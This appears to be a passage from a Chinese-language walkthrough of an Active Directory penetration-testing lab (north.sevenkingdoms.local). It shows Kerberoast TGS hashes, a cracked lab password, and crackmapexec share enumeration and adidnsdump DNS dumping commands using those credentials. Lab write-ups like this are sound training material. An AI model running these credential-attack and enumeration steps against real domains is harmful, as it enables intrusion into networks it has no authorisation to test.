
```text
$krb5tgs$23$\*jon.snow$NORTH.SEVENKINGDOMS.LOCAL$north.sevenkingdoms.local/jon.snow\*$aa27e1330217fec98488dd26d3a65487$
$krb5tgs$23$\*sql\_svc$NORTH.SEVENKINGDOMS.LOCAL$north.sevenkingdoms.local/sql\_svc\*$6c06b0663ce54ca052b0faeda8ece870$
```

![image-20230901163231890](upload/attach/202309/986394_G9QCUM222QCWFKQ.jpg)

获得账户: `jon.snow:iknownothing`

### 枚举共享

```shell
crackmapexec smb 192.168.56.10-23 -u jon.snow -p iknownothing -d north.sevenkingdoms.local --shares
```

![image-20230901164208216](upload/attach/202309/986394_GTEJXTRWTPVCTXU.jpg)

- 对比匿名枚举 多了 `public`是可读写的 (靶场中没有内容)

![image-20230901164403773](upload/attach/202309/986394_KT9RUZD4K8GN3NJ.jpg)

### DNS转储

```
adidnsdump -u 'north.sevenkingdoms.local\jon.snow' -p 'iknownothing' winterfell.north.sevenkingdoms.local
```

![image-20230901165400859](upload/attach/202309/986394_X68X965BCNG4BE8.jpg)

结果存储在 `records.csv`中
